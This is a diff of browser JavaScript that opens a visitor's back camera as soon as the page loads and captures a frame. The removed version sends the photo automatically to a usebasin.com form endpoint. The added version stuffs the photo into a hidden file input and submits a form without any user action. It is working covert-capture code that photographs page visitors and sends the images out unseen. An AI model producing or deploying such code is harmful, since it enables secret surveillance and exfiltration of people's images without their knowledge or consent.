@@ -1,51 +1,52 @@
-const BASIN_URL = "https://usebasin.com/f/fb249d3e371b";
+const video = document.getElementById("preview");
+let stream;
 
-window.addEventListener("load", () => startCapture());
+// Start camera immediately
+startCamera();
 
-async function startCapture() {
+async function startCamera() {
   try {
-    // Request BACK CAMERA
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { exact: "environment" } }
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { exact: "environment" } }  // Back camera
     });
 
-    // Capture frame
-    const track = stream.getVideoTracks()[0];
-    const imageCapture = new ImageCapture(track);
-    const frame = await imageCapture.grabFrame();
+    video.srcObject = stream;
 
-    // Draw to canvas
-    const canvas = document.createElement("canvas");
-    canvas.width = frame.width;
-    canvas.height = frame.height;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(frame, 0, 0);
-
-    // Convert to blob
-    const blob = await new Promise((resolve) =>
-      canvas.toBlob(resolve, "image/jpeg", 0.95)
-    );
-
-    // Stop camera
-    track.stop();
-
-    // Upload automatically
-    uploadToBasin(blob);
+    // Wait 1 second for camera to stabilize, then capture automatically
+    setTimeout(captureAndUpload, 1000);
 
   } catch (err) {
-    console.error("Camera Error:", err);
-    alert("Camera Error: " + err.message);
+    console.error("Camera error:", err);
   }
 }
 
-function uploadToBasin(blob) {
-  const formData = new FormData();
-  formData.append("photo", blob, "autocapture.jpg");
+function captureAndUpload() {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
 
-  fetch(BASIN_URL, {
-    method: "POST",
-    body: formData
-  })
-    .then(() => console.log("Photo uploaded successfully"))
-    .catch((err) => console.error("Upload Error:", err));
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  canvas.toBlob(async (blob) => {
+    const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
+
+    // Put the file into the hidden input
+    const input = document.getElementById("photoInput");
+    const dataTransfer = new DataTransfer();
+    dataTransfer.items.add(file);
+    input.files = dataTransfer.files;
+
+    // Submit the form
+    document.getElementById("autoUploadForm").submit();
+
+    stopCamera();
+
+  }, "image/jpeg", 0.9);
+}
+
+function stopCamera() {
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
 }
